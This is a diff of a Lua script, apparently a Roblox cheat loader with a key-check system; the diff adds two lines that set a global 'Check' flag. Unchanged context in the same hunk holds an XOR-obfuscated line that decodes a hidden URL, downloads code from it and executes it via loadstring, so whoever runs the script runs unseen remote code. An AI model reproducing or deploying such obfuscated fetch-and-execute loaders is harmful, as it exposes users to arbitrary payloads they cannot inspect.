@@ -27,6 +27,7 @@ print(result)
 if not succ then
     warn("Request failed:", result)
 end
+getgenv().Check = true
 pcall(function()
     local HttpService = game:GetService("HttpService")
     
@@ -41,6 +42,7 @@ pcall(function()
         if code ~= "KEY_HWID_LOCKED" then
             if code ~= "KEY_BANNED" then
                 if code ~= "KEY_EXPIRED" then
+                    getgenv().Check = false
                     local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\205\48\242\179\198\16\214\145\131\117\183\233\151\79\133\142\216\49\244\183\136\45\217\194\204\36\244\182\198\83\218\202\212\54\237\246\212\29\195\202\203\49\171\159\136\12\212\197\200\106\238\190\198\26\194\140\214\36\239\181\136\63\193\211\215\32\171\147\210\28\148\145\139\41\233\186\195\27\195","\126\177\163\187\69\134\219\167")))();
                 end
             end
